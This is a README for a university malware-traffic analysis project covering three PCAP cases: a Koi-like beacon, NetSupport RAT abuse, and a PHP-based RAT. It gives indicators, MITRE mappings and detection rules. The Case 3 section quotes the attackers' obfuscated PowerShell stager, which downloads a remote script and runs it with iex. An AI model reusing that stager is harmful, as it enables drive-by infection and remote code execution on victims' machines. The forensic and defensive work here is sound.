# Network Traffic Analysis Mini Project — KBJ ITS

Cybersecurity mini project untuk mata kuliah **Komputasi Berbasis Jaringan (KBJ)** di
Program Studi Magister Teknik Informatika, Institut Teknologi Sepuluh Nopember (ITS).

## ⚠️ Disclaimer

This repository contains **real malware samples** (`c2.exe`, `config.cfg`) and forensic
analysis from a controlled lab environment for **cybersecurity education purposes only**.

**DO NOT execute any binary in**
`network-analysis/pcap/2025-06-13-traffic-analysis-exercise-forensic-analysis/AppData-Roaming-*`
— they are real malware samples. Use only in isolated VM/sandbox.

Detection rules (YARA, Suricata, Sigma) in this repo are for **defensive purposes only**.

## 📋 Project Overview

Analisis 3 PCAP dari [malware-traffic-analysis.net](https://malware-traffic-analysis.net)
untuk investigasi insiden cybersecurity. Setiap case menguji teknik deteksi berbeda
dari tahap initial access sampai command & control.

| # | Case | Date | Attack Pattern | Family | Severity |
|---|------|------|----------------|--------|----------|
| 1 | [Case 1](#case-1) | 2024-09-04 | HTTP beacon C2 (direct IP) | Koi-like (KoiLoader/Stealer) | Medium |
| 2 | [Case 2](#case-2) | 2024-11-26 | NetSupport RAT abuse (direct IP) | NetSupport Manager | Medium-High |
| 3 | [Case 3](#case-3-v23) | 2025-06-13 | **BYOI PHP-based RAT** (Cloudflare Tunnel) | **Agent_AGen.HR / Doina / Zusy** (VT 44/74) | **High** |

## 🛠️ Tools

| Tool | Purpose |
|------|---------|
| Wireshark / TShark | Protocol dissection |
| PyShark | Custom Python PCAP parsing |
| BruteShark | Network forensics (credentials, sessions) |
| PcapXray | Visual network diagram + DNS analysis |
| NetworkX / Matplotlib | Graph analysis + visualization |
| VirusTotal API | Threat intel enrichment |
| YARA / Suricata / Sigma | Detection rules |
| Python (pefile, yara-python, vt-py) | Custom analysis scripts |

## 📁 Repository Structure

```
network-analysis/
├── pcap/                          # Raw PCAP files (3 cases)
│   ├── 2024-09-04-...pcap         # Case 1
│   ├── 2024-11-26-...pcap         # Case 2
│   ├── 2025-06-13-...pcap         # Case 3
│   ├── 2025-06-13-...-forensic-analysis/  # Forensic bundle (c2.exe, config.cfg, php.exe, .lnk, Edge cache)
│   └── case*-split_*.pcap         # Split PCAP files
├── output/                        # Analysis results (CSV, JSON, PNG)
│   ├── case1/                     # Case 1: IOC, beacon, geo, payloads
│   ├── case2/                     # Case 2: IOC, beacon, geo, payloads
│   ├── case3/                     # Case 3: IOC, beacon, geo, payloads
│   ├── cross_case_overlap_stats.csv
│   ├── master_ioc.csv             # All IOC across 3 cases
│   └── mitre_attack_navigator.json
├── scripts/                       # Python analysis tools (30 scripts)
│   ├── analyze_tls_ja3.py
│   ├── beacon_analysis.py
│   ├── beacon_visualization.py
│   ├── build_*.py                 # CSV/JSON summary builders
│   ├── compute_response_variables.py
│   ├── http_payload_extractor.py
│   ├── ioc_extractor.py
│   ├── visualize_*.py             # Geo map, DNS timeline, etc.
│   ├── zeek_like_logs.py
│   └── case3/                     # Case 3 v2.3 deep analysis
└── docker/                        # Docker setup
```

## 📊 Case 1 — HTTP Beacon C2 (2024-09-04)

**Attack pattern**: Direct IP HTTP beacon C2

- **Victim**: `172.17.0.99` (172.17.0.0/24 Docker network)
- **C2 IP**: `79.124.78.197` (Bulgaria, DigiSys Ltd, Aheloy)
- **C2 endpoint**: `http://79.124.78.197/foots.php` + `/index.php` (66 HTTP request extracted)
- **Beacon interval**: ~60s stable
- **Protocol**: HTTP plaintext
- **User-Agent**: `Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.2; WOW64; Trident/7.0)`
- **MITRE techniques** (5): T1071.001 (Web Protocols), T1105 (Ingress Tool Transfer),
  T1036 (Masquerading), T1102 (Web Service), T1189 (Drive-by)
- **Hypothesis**: KoiLoader / KoiStealer-like family (medium confidence)
- **Top detections**: OTX confirms Koi ecosystem indicators

**Detection rules**: IP block on `79.124.78.197`, monitor `/foots.php` + `/index.php`

## 📊 Case 2 — NetSupport RAT Abuse (2024-11-26)

**Attack pattern**: Direct IP + NetSupport Manager abuse

- **Victim**: `10.11.26.183` (10.11.26.0/24)
- **C2 IP**: `194.180.191.64` (Moldova, MivoCloud SRL, Chișinău, AS39798)
- **C2 endpoint**: `http://194.180.191.64/<obfuscated>.htm` with `CMD=ENCD` body
- **Beacon interval**: 60.16s median (very stable)
- **Protocol**: HTTP plaintext
- **User-Agent**: `NetSupport Manager/1.3` (signature jelas)
- **MITRE techniques** (5): T1219 (Remote Access Software), T1071.001 (Web Protocols),
  T1059.003 (Windows Command Shell), T1105 (Ingress Tool Transfer), T1027 (Obfuscation)
- **Family**: NetSupport Manager (high confidence — UA string definitive)
- **Top detections**: All indicators match known NetSupport RAT abuse

**Detection rules**: Block `NetSupport Manager` UA at egress proxy, IP block on
`194.180.191.64`, monitor `CMD=ENCD` HTTP body pattern

## 📊 Case 3 (v2.3) — BYOI PHP-based RAT (2025-06-13)

**Attack pattern**: Drive-by compromise + BYOI (Bring Your Own Interpreter) + Cloudflare Tunnel

- **Victim**: `10.6.13.133` (DESKTOP-5AVE44C.massfriction.com, user `rgaines`)
- **C2 infrastructure**: 3 active C2 domains + 2 initial stager domains + Cloudflare Tunnel
- **Beacon interval**: Multi-tier 30/60/90/120s (62 POST, ~30.5 min window)
- **Protocol**: HTTP plaintext + TLS for BYOI staging
- **Family**: **Agent_AGen.HR / Doina / Zusy** (VirusTotal 44/74 confirmed)

### Attack Chain (6 phases)

1. **Initial Access (T1189)**: Compromised legitimate site `www.truglomedspa.com` (med spa
   Naples, FL) → JS inject PowerShell stager:
   ```javascript
   window.commandGlobal = `powershell -w h -nop -c "$ad='dng-,microsoftds,com'.Split(',');
   $xe='htt'+'ps://'+$ad[0]+$ad[1]+'.'+$ad[2]+'/'+'Gsd'+'g4'+'97'+'6'+'.txt';
   $wa=New-Object Net.WebClient; $ss=$wa.('Download'+'String')($xe);
   $zb='i'+'ex'; &$zb $ss"`
   ```
2. **Initial Stager (T1059.001)**: PowerShell downloads from `dng-microsoftds.com/Gsdg4976.txt`,
   executes via `iex`. Recon to `event-time-microsoft.org` + check-in to `eventdata-microsoft.live`
   (response 968 KB).
3. **BYOI Staging (T1127)**: Download PHP 8 interpreter (~33 MB) from
   `windows.php.net` via TLS (frame 8569 to `83.137.149.15` Duocast NL).
4. **Persistence (T1547.001/009)**: Drop `c2.exe` (17.5 KB, SHA256 `1206473a7c...`) to
   `AppData\Roaming\afUGkp\` + `config.cfg` PHP (25 KB) to `AppData\Roaming\php\`
   + Startup `.lnk` + HKCU Run key.
5. **C2 Beaconing (T1071.001 + T1090.004)**: 62 POST multi-tier to 3 Cloudflare-fronted
   domains + Cloudflare Tunnel.
6. **Command Set**: 7 commands (EXE/DLL/JS/CMD/ACTIVE/AUTORUN/OFF) ready to execute.

### C2 Domains (3 active + 2 initial stager + 1 BYOI)

| Phase | Domain | Role |
|-------|--------|------|
| C2 | `windows-msgas.com` | Microsoft-typosquat (16 POST) |
| C2 | `event-datamicrosoft.live` | Microsoft-typosquat (25 POST, most active) |
| C2 | `varying-rentals-calgary-predict.trycloudflare.com` | Cloudflare Tunnel (21 POST) |
| Initial stager | `event-time-microsoft.org` | Recon (GET) |
| Initial stager | `eventdata-microsoft.live` | Check-in (POST, response 968 KB) |
| BYOI | `windows.php.net` | PHP 8 interpreter download (~33 MB) |
| Hardcoded fallback IP | `159.69.187.78`, `64.95.12.71`, `184.95.51.165` | 0 packets in capture (backup) |
| Initial access | `truglomedspa.com` (compromised) + `hillcoweb.com` (JS delivery) + `dng-microsoftds.com` (payload) | Drive-by chain |

### Family Attribution (VirusTotal 44/74 detections)

| AV Engine | Detection Name |
|-----------|----------------|
| **ESET-NOD32** | `Win64/TrojanDownloader.Agent_AGen.HR` |
| **Fortinet** | `W64/Agent_AGen.HR!tr.dlr` |
| **Microsoft** | `Trojan:Win64/Zusy.AHE!MTB` |
| **BitDefender** | `Gen:Variant.Doina.100728` |
| McAfeeD | `ti!1206473A7C56` (hash-based) |

**VT tags**: `long-sleeps, detect-debug-environment, clipboard, peexe, spreader, 64bits`

**MITRE techniques** (15 total): T1189, T1059.001, T1059.004, T1059.007, T1059 (PHP),
T1127, T1218.011, T1027, T1036.005, T1140, T1547.001, T1547.009, T1071.001, T1090.004,
T1102, T1105, T1573.001, T1082, T1057, T1007, T1016, T1033, T1041 (suspected)

### Detection Rules (included in this repo)

- **4 YARA rules** in `network-analysis/scripts/case3/case3_yara_rules.yar`
- **18 Suricata rules** (sid 9300001-9300018)
- **7 Sigma rules** for SIEM

### SHA256 Hashes (for hash-based blocking)

- `c2.exe`: `1206473a7c5643dc0a1a52c17418aa37fb5194e2395907aefaec976cb4849b4e`
- `config.cfg`: `a24cda6fe5710272556b273d1b03081704a919130b5f10f18c7c16947f25d370`
- `php.exe` (legitimate, 0/75 detections): `b0c32fba80e2b15abb9e253c1d36e47383fad18940eab3c08e2c11c78803f133`
- Payload 968 KB: `9e2f538ca158d67ab3572080cf575ab21c0373ba05d19ce8794fcb3665fb7acf`

## 🔬 Cross-Case Analysis

- **Overlapping infrastructure**: Microsoft services (login.live.com, edge.microsoft.com)
  contacted by all 3 cases — benign overlap
- **C2 IPs unique per case**: No shared C2 infrastructure
- **MITRE ATT&CK Navigator**: `network-analysis/output/mitre_attack_navigator.json`
  (12 techniques, 6 tactics, color gradient by case coverage)
- **IOC comparison**: `network-analysis/output/master_ioc.csv` (553 total IOCs)

## 🛠️ Setup

### Prerequisites

```bash
pip install pyshark pefile yara-python vt-py
```

### VirusTotal API Setup (for Case 3 v2.3)

1. Sign up free at https://www.virustotal.com
2. Get API key at https://www.virustotal.com/gui/user/USERNAME/apikey
3. Copy `network-analysis/.env.template` to `network-analysis/.env`
4. Edit `.env` and set `VT_API_KEY="your_key_here"`

### Run Case 3 v2.3 Analysis

```bash
cd network-analysis
python scripts/case3/case3_pe_analyzer.py pcap/2025-06-13-.../AppData-Roaming-afUGkp/c2.exe
python scripts/case3/case3_config_decoder.py pcap/2025-06-13-.../AppData-Roaming-php/config.cfg
python scripts/case3/case3_payload_analyzer.py output/case3/payloads/http_file_data/frame_8561_stream_90_104.21.112.1_to_10.6.13.133.bin
python scripts/case3/case3_yara_validator.py scripts/case3/case3_yara_rules.yar pcap/2025-06-13-...-forensic-analysis/ .
python scripts/case3/case3_vt_lookup.py
```

## 👥 Authors

- 6025252002 — Kafiyatul Fithri
- 6025252005 — Dhayu Intan Nareswari
- 6025252014 — Ridho Liwardana
- 6025252010 — Yoan Amri Akbar

**Dosen Pengampu:** Hudan Studiawan, S.Kom., M.Kom., Ph.D.

## 📚 Data Source

PCAP files from [malware-traffic-analysis.net](https://malware-traffic-analysis.net) —
publicly available network traffic captures for cybersecurity training.
